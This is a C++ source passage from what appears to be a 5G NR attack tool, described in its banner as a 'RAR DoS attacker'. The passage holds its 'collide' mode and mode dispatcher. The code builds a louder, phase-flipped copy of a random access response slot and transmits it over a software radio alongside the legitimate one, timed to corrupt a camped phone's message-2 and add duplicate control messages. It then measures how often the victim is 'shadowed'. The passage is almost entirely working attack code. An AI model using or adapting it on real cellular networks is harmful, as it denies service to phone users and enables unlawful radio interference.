            << " -> RX " << cfg_.rx_subdev << "\n";

  const uint16_t prbs = static_cast<uint16_t>(std::min(
      51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
                           (12.0 * static_cast<double>(cfg_.scs_khz)))));
  nr::Ofdm tx_ofdm(cfg_.sample_rate, cfg_.scs_khz * 1000.0, prbs);
  const nr::RarSlotTx burst = nr::build_rar_slot(tx_ofdm, cfg_.pci, prbs, 0.5f);
  SampleBuffer legit = burst.legit;
  SampleBuffer attack = burst.attack;
  // TX levels: the legit slot must be at least as strong as the loopback marker
  // that produced corr 0.98 (loopback.tx_scale 5). The attack copy is only
  // modestly louder so neither burst clips the DAC (fft peaks ~ 127/N); the
  // destructive overlap still flips message-2 phase and doubles the RAR PDCCH.
  {
    const float ls = static_cast<float>(cfg_.collide_legit_scale);
    const float as = static_cast<float>(cfg_.collide_attack_scale);
    for (auto& v : legit) v *= ls;
    for (auto& v : attack) v *= ls * as;
    float peak = 0.0f;
    for (const auto& v : legit) peak = std::max(peak, std::abs(v));
    for (const auto& v : attack) peak = std::max(peak, std::abs(v));
    if (peak > 0.9f) {  // keep both bursts out of ADC/DAC saturation; attack stays louder
      const float fac = 0.9f / peak;
      for (auto& v : legit) v *= fac;
      for (auto& v : attack) v *= fac;
    }
  }
  auto rms = [](const SampleBuffer& b) {
    return std::sqrt(std::accumulate(b.begin(), b.end(), 0.0,
                                     [](double a, const Sample& s){ return a + std::norm(s); })
                     / b.size());
  };
  const double sym_sec = static_cast<double>(burst.slot_samples) / 14.0 /
                         cfg_.sample_rate;
  std::printf("[collide] slot=%zu samples grid=%zu legit_amp=%.4f "
              "attack_amp=%.4f legit_scale=%.1f attack_scale=%.1f sym_len=%.1f us\n",
              burst.slot_samples, burst.grid.size(), rms(legit), rms(attack),
              cfg_.collide_legit_scale, cfg_.collide_attack_scale, sym_sec * 1e6);

  // ---- Victim: a UE already camped on the cell. It keeps its own clock, so
  // it looks for the SSB (PSS) near the expected arrival t_tx + latency; PSS
  // acquisition refines timing to the sample grid and hands the victim a CFO
  // estimate (from the PSS two-half phase ramp), which it derotates. Per symbol
  // it then correlates the demodulated subcarriers against the known message-2
  // grid (clarity); the RarDecoder reports RAR PDCCH DM-RS observations. A
  // later, louder hijacker burst flips/collapses message-2 clarity on the
  // overlapped symbols and adds an extra RAR PDCCH — duplicate/conflicting DoS.
  const uint32_t fft_size = static_cast<uint32_t>(std::llround(
      cfg_.sample_rate / (cfg_.scs_khz * 1000.0)));
  const auto pss_ref = nr::pss_time_reference(cfg_.pci % 3, fft_size,
                                              cfg_.sample_rate,
                                              cfg_.scs_khz * 1000.0);
  const size_t sym4_off = burst.symbol_offsets[4];
  const size_t cp4 = tx_ofdm.cp_len(4);
  const size_t pss_start_in_slot = sym4_off + cp4;   // PSS body start within the slot
  struct VictimScore {
    bool     aligned = false;
    size_t   align_sample = 0;
    std::vector<nr::PssPeak> peaks;  // every PSS hit in the window, strongest first
    double   cfo_hz = 0.0;           // CFO at the acquired peak
    size_t   rar_obs = 0;
    std::vector<nr::RarDciObs> rar;
    std::vector<float> msg2;   // clarity per slot symbol 2..13 (real part corr)
  };
  nr::RarDecoder victim_dec(cfg_.sample_rate, cfg_.scs_khz * 1000.0, cfg_.pci,
                            prbs, false);
  nr::Ofdm victim_ofdm(cfg_.sample_rate, cfg_.scs_khz * 1000.0, prbs);

  // A UE scans the whole observation for its SSB — no assumption about where
  // in the window the slot starts. `pred_slot` is only a diagnostic reference.
  auto score = [&](const SampleBuffer& win, size_t pred_slot) -> VictimScore {
    VictimScore s;
    s.peaks = nr::pss_scan(win, pss_ref, 0.4f, cfg_.sample_rate);
    if (s.peaks.empty()) return s;
    const nr::PssPeak& best = s.peaks.front();
    if (best.offset < pss_start_in_slot) return s;
    const size_t slot_start = best.offset - pss_start_in_slot;
    if (slot_start + burst.slot_samples > win.size()) return s;
    s.aligned = true;
    s.align_sample = slot_start;
    SampleBuffer aligned(win.begin() + static_cast<ptrdiff_t>(slot_start),
                         win.begin() + static_cast<ptrdiff_t>(slot_start + burst.slot_samples));
    // Refine CFO with cyclic-prefix correlation over all 14 symbols. The PSS
    // two-half estimate only spans ~17 us and leaves hundreds of Hz of residual
    // CFO, which slowly rotates the constellation across the slot (clarity
    // decays to ~0 by symbol 13 on live RF). CP correlation integrates the full
    // slot -> sub-kHz accuracy (unambiguous up to +/-15 kHz at 30 kHz SCS).
    {
      std::complex<double> cp_acc(0.0, 0.0);
      for (uint16_t sy = 0; sy < burst.grid.size() && sy < 14; ++sy) {
        const size_t off = burst.symbol_offsets[sy];
        const size_t cp = victim_ofdm.cp_len(sy);
        if (off + cp + victim_ofdm.fft_size() > aligned.size()) break;
        for (size_t i = 0; i < cp; ++i)
          cp_acc += aligned[off + i] * std::conj(aligned[off + victim_ofdm.fft_size() + i]);
      }
      const double cfo_rad_s = cp_acc == std::complex<double>(0.0, 0.0)
          ? 0.0 : -std::arg(cp_acc) / (victim_ofdm.fft_size() / cfg_.sample_rate);
      s.cfo_hz = cfo_rad_s / (2.0 * 3.14159265358979323846);
    }
    s.cfo_hz = std::abs(s.cfo_hz) < 1.0 ? 0.0 : s.cfo_hz;
    // CFO derotation before OFDM demodulation kills inter-subcarrier leakage.
    const double w = 2.0 * 3.14159265358979323846 * s.cfo_hz / cfg_.sample_rate;
    if (std::abs(w) > 1e-12)
      for (size_t i = 0; i < aligned.size(); ++i)
        aligned[i] *= std::exp(std::complex<double>(0.0, -w * static_cast<double>(i)));
    s.rar = victim_dec.decode(aligned);
    s.rar_obs = s.rar.size();

    auto syms = victim_ofdm.demodulate(aligned);
    for (uint16_t sy = 2; sy <= 13; ++sy) {
      if (sy >= syms.size()) break;
      const auto& rx = syms[sy].samples;
      const auto& rg = burst.grid[sy].samples;
      std::complex<double> dot(0.0, 0.0);
      double ea = 0.0, eg = 0.0;
      const size_t L = std::min(rx.size(), rg.size());
      for (size_t k = 0; k < L; ++k) {
        dot += rx[k] * std::conj(rg[k]);
        ea += std::norm(rx[k]);
        eg += std::norm(rg[k]);
      }
      // Phase-agnostic but flip-sensitive clarity: an RF-imposed per-symbol
      // phase (mid-slot step seen on live RX) would collapse the signed real
      // correlation; instead preserve |corr| and keep the sign of its real
      // part, which still flips when the attacker rotates the payload ~180 deg.
      const double dm = std::abs(dot) / std::sqrt(ea * eg);
      s.msg2.push_back(ea > 1e-12 && eg > 1e-12
                           ? static_cast<float>(dot.real() < 0.0 ? -dm : dm)
                           : 0.0f);
    }
    return s;
  };

  if (cfg_.dry_run) {
    // Offline sanity: inject into synthetic noise at known offsets and confirm
    // the victim sees full message-2 clarity in control and a sign flip /
    // collapse on the overlapped symbols (plus extra RAR PDCCH) when the loud
    // flipped attack copy is advanced into the slot.
    const size_t base = 9000;
    SampleBuffer ctl = nr::synth_noise(base + 2 * burst.slot_samples);
    for (size_t t = 0; t < legit.size(); ++t) ctl[base + t] += 15.0f * legit[t];
    auto sc = score(ctl, base);
    float cmin = sc.msg2.empty() ? 0.0f
                                 : *std::min_element(sc.msg2.begin(), sc.msg2.end());
    std::printf("[collide] dry-run control: aligned=%s rar_obs=%zu msg2_min=%.3f "
                "peaks=%zu best=%.3f@off%zu\n",
                sc.aligned ? "yes" : "no", sc.rar_obs, cmin,
                sc.peaks.size(), sc.peaks.empty() ? 0.0 : sc.peaks.front().corr,
                sc.peaks.empty() ? 0 : sc.peaks.front().offset);
    if (!sc.aligned || sc.rar_obs < 1 || cmin < 0.5f) {
      std::cerr << "[collide] dry-run FAILED at control\n";
      return 1;
    }

    const double d = cfg_.collide_delay_symbols.front();
    const size_t adv = burst.symbol_offsets[static_cast<size_t>(std::lround(d)) % 14];
    SampleBuffer att = nr::synth_noise(base + 2 * burst.slot_samples + adv);
    for (size_t t = 0; t < legit.size(); ++t) att[base + t] += 15.0f * legit[t];
    // The hijacker is the LOUDER burst (test_collide pre-scales attack x10, i.e.
    // 30x in-window vs legit 15x). With only 3x here the legit 15x dominates the
    // overlapped symbols and the phase flip is swamped -> amin stays positive.
    for (size_t t = 0; t < attack.size(); ++t) att[base + adv + t] += 30.0f * attack[t];
    auto sa = score(att, base);
    float amin = sa.msg2.empty() ? 0.0f
                                 : *std::min_element(sa.msg2.begin(), sa.msg2.end());
    std::printf("[collide] dry-run attack d=%.1f (adv=%zu): aligned=%s rar_obs=%zu "
                "msg2_min=%.3f (ctl rar=%zu ctl min=%.3f) peaks=%zu\n",
                d, adv, sa.aligned ? "yes" : "no", sa.rar_obs, amin,
                sc.rar_obs, cmin, sa.peaks.size());
    const bool ok = sa.aligned && (amin < cmin - 0.5f || sa.rar_obs > sc.rar_obs);
    std::cout << "[collide] dry-run " << (ok ? "PASS" : "FAILED")
              << " (victim message-2 shadowed / extra RAR PDCCH)\n";
    return ok ? 0 : 1;
  }

  try {
    RadioUhd radio(cfg_);
    radio.sync_time(0.0);
    std::cout << "[collide] device time zeroed (set_time_now=0) for shared TX/RX epoch\n";
    radio.start_streaming();

    // RX window only needs to span the victim's slot after the legit burst
    // arrives (~t_tx + 8 us). An attack at delay <= 13 symbols lands INSIDE
    // that slot, which is exactly the collision we want the victim to see.
    const double span = static_cast<double>(burst.slot_samples) / cfg_.sample_rate;
    const double window_sec = span + 0.0005;
    const double sample_sec = 1.0 / cfg_.sample_rate;
    SampleBuffer acc, pkt(65536);

    double ctl_rar = 0, ctl_clr = 0;
    bool have_ctl = false;
    uint32_t shadowed = 0, total = 0;

    size_t window_idx = 0;
    const size_t n_windows = 1 + cfg_.collide_iterations * cfg_.collide_delay_symbols.size();
    for (size_t wi = 0; wi < n_windows && !stop_.load(); ++wi) {
      const bool is_ctl = (wi == 0);
      const double delta = is_ctl ? 0.0 : cfg_.collide_delay_symbols[
          (wi - 1) % cfg_.collide_delay_symbols.size()];
      const uint32_t it = is_ctl ? 0 : static_cast<uint32_t>((wi - 1) /
                                                             cfg_.collide_delay_symbols.size());
      const double t_tx = radio.uhd_now_sec() + 0.010 + window_idx * (window_sec + 0.04);
      radio.transmit_timed(legit, t_tx);
      if (!is_ctl) {
        // Integer-symbol advance: land attack symbol 0 exactly on the victim's
        // demod grid for deterministic per-symbol phase flips.
        const size_t s_idx = static_cast<size_t>(std::lround(delta)) % 14;
        const double t_att = t_tx + static_cast<double>(burst.symbol_offsets[s_idx]) /
                                      cfg_.sample_rate;
        radio.transmit_timed(attack, t_att);
      }

      acc.clear();
      // RX packets arrive as ~65536-sample (2.84 ms) chunks, so t_acc0 is
      // quantized to packet boundaries. To GUARANTEE the burst (t_tx+~153 us)
      // is inside the captured chunk, seek the window start ~3 ms BEFORE the
      // burst: whichever packet boundary lands, the chunk covers the burst.
      const double want_t0 = t_tx - 3.2e-3;
      const double want_t1 = t_tx + 0.70 * window_sec;
      double t_acc0 = 0.0;
      bool need_t0 = true, rxgapped = false;
      for (int guard = 0; guard < 400 && !stop_.load(); ++guard) {
        double t_pkt = 0.0; bool got = false;
        std::size_t n = radio.recv_timed(pkt, 0.05, got, t_pkt);
        if (!got || n == 0) continue;
        if (need_t0) {
          if (t_pkt < want_t0) continue;
          t_acc0 = t_pkt; need_t0 = false;
        } else {
          const double exp_t = t_acc0 + acc.size() * sample_sec;
          const double drift = std::abs(t_pkt - exp_t) / sample_sec;
          if (drift > 128.0) { rxgapped = true; acc.clear(); need_t0 = true; continue; }
        }
        acc.insert(acc.end(), pkt.begin(), pkt.begin() + static_cast<ptrdiff_t>(n));
        if (t_acc0 + acc.size() * sample_sec >= want_t1) break;
      }
      // Trim to the intended span if the anchor landed early (one recv chunk
      // overshoots want_t1 by up to ~2 ms).
      const double span_need = (want_t1 - t_acc0) * cfg_.sample_rate;
      if (span_need > 0 && acc.size() > static_cast<size_t>(span_need))
        acc.resize(static_cast<size_t>(span_need));
      if (acc.empty()) {
        std::cerr << "[collide] window " << wi << ": no RX data\n";
        continue;
      }

      // Camped-UE expected arrival: at the TX time plus the measured burst
      // latency (symbol_advance_us is our calibrated +7.5..8 us) — the victim
      // keeps THIS clock, so the attack burst is its own separate observation.
      const size_t exp_align = static_cast<size_t>(std::max(
          0.0, (t_tx - t_acc0) * cfg_.sample_rate)) +
          static_cast<size_t>(std::round(cfg_.symbol_advance_us * 1e-6 * cfg_.sample_rate));

      if (!cfg_.collide_dump_path.empty()) {
        std::string p = cfg_.collide_dump_path;
        if (!p.empty() && p.back() != '.') p += "_";
        p += is_ctl ? "ctl.cf32"
: ("att_d" + std::to_string(static_cast<int>(std::lround(delta))) +
                           "_i" + std::to_string((unsigned)it) + ".cf32");
        if (nr::write_cf32(p, acc))
          std::printf("[collide] wrote %s (%zu samples)\n", p.c_str(), acc.size());
      }

      VictimScore sc = score(acc, exp_align);
      const float clr_min = sc.msg2.empty()
          ? 0.0f : *std::min_element(sc.msg2.begin(), sc.msg2.end());
      double win_peak = 0.0, win_rms = 0.0;
      for (const auto& v : acc) {
        win_peak = std::max(win_peak, (double)std::abs(v));
        win_rms += std::norm(v);
      }
      win_rms = std::sqrt(win_rms / acc.size());
      auto delay_us_of = [&](size_t off) {
        return (t_acc0 + off / cfg_.sample_rate - t_tx) * 1e6;
      };
      if (is_ctl) {
        ctl_rar = sc.rar_obs; ctl_clr = clr_min;
        have_ctl = sc.aligned;
        std::printf("[collide] CONTROL d=%4.1f: aligned=%s rar_obs=%zu "
                    "msg2_min=%.3f peaks=%zu",
                    delta, sc.aligned ? "yes" : "no", sc.rar_obs, clr_min,
                    sc.peaks.size());
        for (const auto& pk : sc.peaks)
          std::printf(" [%.3f@%zu(%+.1fus)%+.0fHz]",
                      pk.corr, pk.offset, delay_us_of(pk.offset), pk.cfo_hz);
        std::printf(" win{n=%zu rms=%.5f pk=%.5f t0=%+.1fus} "
                    "(rx ovf=%llu lost=%llu txu=%llu%s)\n",
                    acc.size(), win_rms, win_peak,
                    (t_tx - t_acc0) * 1e6,
                    (unsigned long long)radio.rx_overflow_count(),
                    (unsigned long long)radio.rx_lost_count(),
                    (unsigned long long)radio.tx_underrun_count(),
                    rxgapped ? " GAP" : "");
        for (const auto& r : sc.rar)
          std::printf("   rar: sym=%u AL=%u corr=%.3f%s\n", r.symbol,
                      r.aggregation_level, r.correlation, r.decoded_bits ? " (bits)" : "");
        for (size_t m = 0; m < sc.msg2.size(); ++m)
          std::printf("   msg2 sym%zu: rho=%.3f\n", m + 2, sc.msg2[m]);
      } else {
        ++total;
        const bool shadowed_by_dup = sc.rar_obs > ctl_rar || clr_min < ctl_clr - 0.5f;
        if (shadowed_by_dup) ++shadowed;
        std::printf("[collide] ATTACK   d=%4.1f it=%u: aligned=%s rar_obs=%zu "
                    "(ctl=%zu) msg2_min=%.3f (ctl=%.3f) peaks=%zu",
                    delta, (unsigned)it, sc.aligned ? "yes" : "no",
                    sc.rar_obs, (size_t)ctl_rar, clr_min, ctl_clr,
                    sc.peaks.size());
        for (const auto& pk : sc.peaks)
          std::printf(" [%.3f@%zu(%+.1fus)%+.0fHz]",
                      pk.corr, pk.offset, delay_us_of(pk.offset), pk.cfo_hz);
        std::printf(" win{n=%zu rms=%.5f pk=%.5f t0=%+.1fus} -> %s\n",
                    acc.size(), win_rms, win_peak,
                    (t_tx - t_acc0) * 1e6,
                    shadowed_by_dup ? "SHADOWED (message-2 phase-flip / extra RAR PDCCH)"
                                    : "no effect");
        for (const auto& r : sc.rar)
          std::printf("   rar: sym=%u AL=%u corr=%.3f\n", r.symbol, r.aggregation_level,
                      r.correlation);
        for (size_t m = 0; m < sc.msg2.size(); ++m)
          std::printf("   msg2 sym%zu: rho=%.3f\n", m + 2, sc.msg2[m]);
      }
      ++window_idx;
      std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }

    radio.stop_streaming();
    std::cout << "[collide] summary: control aligned=" << (have_ctl ? "yes" : "no")
              << " rar_obs=" << (size_t)ctl_rar << " msg2_min=" << ctl_clr
              << " | attacked windows " << shadowed << "/" << total
              << " shadowed (message-2 phase-flip / extra RAR PDCCH)\n";
    return total > 0 && shadowed == 0 ? 1 : 0;
  } catch (const std::exception& e) {
    std::cerr << "[collide] " << e.what() << "\n";
    return 1;
  }
}

int AttackEngine::run()
{
  std::cout << "5Gone RAR DoS attacker — mode=" << cfg_.mode
            << " srate=" << cfg_.sample_rate / 1e6 << " MSPS\n";

  if (cfg_.mode == "sim") return run_sim();
  if (cfg_.mode == "inject") return run_inject();
  if (cfg_.mode == "live") return run_live();
  if (cfg_.mode == "prach") return run_prach();
  if (cfg_.mode == "bus") return run_bus();
  if (cfg_.mode == "loopback") return run_loopback();
  if (cfg_.mode == "collide") return run_collide();

  std::cerr << "unknown mode: " << cfg_.mode
            << " (use sim|inject|live|prach|bus|loopback|collide)\n";
  return 1;
}

} // namespace gone
